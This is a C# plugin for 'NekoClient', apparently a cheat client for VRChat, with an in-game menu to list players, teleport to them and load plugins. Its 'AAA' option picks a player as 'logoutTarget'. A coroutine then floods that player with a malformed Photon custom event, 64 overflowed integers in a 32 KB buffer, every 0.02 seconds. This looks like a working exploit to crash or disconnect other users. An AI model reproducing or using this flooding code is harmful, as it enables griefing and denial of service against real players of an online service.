using ExitGames.Client.Photon;
using Loader;
using NekoClient;
using NekoClient.Logging;
using NekoClient.UI;
using NekoClient.Wrappers.Reflection;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using UnityEngine;
using VRC;
using VRC.Core;

namespace PluginReloadTester
{
    public class PluginReloadTester : PluginBase
    {
        public PluginReloadTester()
        {
            Load += PluginReloadTester_Load;
            Gui += PluginReloadTester_Gui;
            QueueCoroutine(LogoutThread());
        }

        private void PluginReloadTester_Load()
        {
            Drawing.SetMenuTriggers(KeyCode.M, KeyCode.Return, KeyCode.Backspace, KeyCode.UpArrow, KeyCode.DownArrow, KeyCode.LeftArrow, KeyCode.RightArrow);
        }

        int logoutTarget = -1;

        private IEnumerator LogoutThread()
        {
            byte[] SerializeShit(object function)
            {
                unchecked
                {
                    int[] src = new int[64];
                    byte[] dest = new byte[32768];

                    for (int i = 0; i < src.Length; i++)
                    {
                        src[i] = Math.Abs(Int32.MinValue);
                    }

                    int offset = 0;

                    for (int i = 0; i < src.Length; i++)
                    {
                        Protocol.Serialize((int)src[i], dest, ref offset);
                    }

                    return dest;
                }
            }

            SerializeMethod method = new SerializeMethod(SerializeShit);

            Log.Info("Thread running?");

            while (true)
            {
                if (logoutTarget != -1)
                {
                    PhotonNetworkWrappers.SendCustomEvent(logoutTarget, method);
                }

                yield return new WaitForSeconds(0.1f / 5.0f);
            }
        }

        private string CleanPlayerName(string name)
        {
            name = name.Replace("VRCPlayer[Local]", "").Replace("VRCPlayer[Remote]", "");

            List<string> nameParts = name.Split(' ').ToList();

            nameParts.RemoveAt(nameParts.Count() - 1);

            name = string.Join(" ", nameParts.ToArray());

            return name;
        }

        private void Main()
        {
            Drawing.StyleMenu();
            Drawing.SetMenuTitle("NekoClient");

            Drawing.AddMenuOption("Players", MenuId.Players);
            Drawing.AddMenuOption("Plugins", MenuId.DynamicPrefabs);
        }

        private Player m_selectedPlayer;

        private void Players()
        {
            Drawing.StyleMenu();
            Drawing.SetMenuTitle("NekoClient: Players");

            foreach (Player player in PlayerManager.GetAllPlayers())
            {
                if (player == null || player.ApiUser() == null)
                {
                    continue;
                }

                string prefix = $"";

                if (player.IsMaster())
                {
                    prefix += "[M]";
                }

                if (player.IsInstanceOwner())
                {
                    prefix += "[O]";
                }

                string photonNameClean = (player.name != null) ? CleanPlayerName(player.name) : "emptyname";
                string displayName = player?.ApiUser()?.displayName ?? "emptyname";

                string colourPrefix = "";
                string colourSuffix = "";

                void buildColour(string colour)
                {
                    colourPrefix = $"<color={colour}>";
                    colourSuffix = "</color>";
                }

                string targetPlayerId = player?.UserId() ?? "emptyid";

                if (APIUser.CurrentUser.friendIDs != null && APIUser.CurrentUser.friendIDs.Contains(targetPlayerId))
                {
                    buildColour("cyan");
                }

                Drawing.AddMenuEntry($"{colourPrefix}{prefix}{photonNameClean} [{displayName}]{colourSuffix}");

                if (Drawing.m_optionCount == Drawing.m_currentOption && Drawing.m_optionPress)
                {
                    m_selectedPlayer = player;

                    Drawing.ChangeSubmenu(MenuId.PlayerDetails);
                }
            }
        }

        private void PlayerDetails()
        {
            Drawing.StyleMenu();
            Drawing.SetMenuTitle($"Player: {CleanPlayerName(m_selectedPlayer.name)}");

            int tp = Drawing.AddMenuEntry("Teleport to player");
            int rot = Drawing.AddMenuEntry("Copy player rotation");
            int dump = Drawing.AddMenuEntry("Dump Player Properties");
            int gen5entry = Drawing.AddMenuEntry("AAA");
            int stopAAA = -1;

            if (logoutTarget != -1)
            {
                stopAAA = Drawing.AddMenuEntry("Stop AAA");
            }

            if (Drawing.IsEntryPressed(tp))
            {
                PlayerWrappers.GetLocalPlayer().transform.position = m_selectedPlayer.transform.position;
            }

            if (Drawing.IsEntryPressed(rot))
            {
                PlayerWrappers.GetLocalPlayer().transform.rotation = m_selectedPlayer.transform.rotation;
            }

            if (Drawing.IsEntryPressed(gen5entry))
            {
                logoutTarget = m_selectedPlayer.PhotonPlayer().PhotonActor();
                Log.Info($"Target set to {logoutTarget}");
            }

            if (Drawing.IsEntryPressed(stopAAA))
            {
                logoutTarget = -1;
            }
        }

        private void Plugins()
        {
            Drawing.StyleMenu();
            Drawing.SetMenuTitle("NekoClient: Plugins");

            foreach (string assembly in PluginLoader.GetAvailableAssemblies())
            {
                string color = "#ff0000";
                bool loaded = false;

                if (PluginLoader.GetLoadedAssemblyNames().Contains(assembly))
                {
                    loaded = true;
                    color = "#00ff00";
                }

                string[] nameSplit = assembly.Split('\\');
                int entry = Drawing.AddMenuEntry($"<color={color}>{nameSplit[nameSplit.Length - 1]}</color>");

                if (Drawing.IsEntryPressed(entry))
                {
                    if (loaded)
                    {
                        PluginLoader.UnloadAssembly(assembly);
                    }
                    else
                    {
                        PluginLoader.LoadAssembly(assembly);
                    }
                }
            }
        }

        private void PluginReloadTester_Gui()
        {
            Drawing.HandleInput();
            Drawing.m_optionCount = 0;

            switch (Drawing.m_subMenu)
            {
                case MenuId.Main:
                    Main();
                    break;
                case MenuId.Players:
                    Players();
                    break;
                case MenuId.PlayerDetails:
                    PlayerDetails();
                    break;
                case MenuId.DynamicPrefabs:
                    Plugins();
                    break;
                case MenuId.NotOpen:
                default:
                    break;
            }

            Drawing.m_leftPress = false;
            Drawing.m_rightPress = false;
            Drawing.m_optionPress = false;
        }
    }
}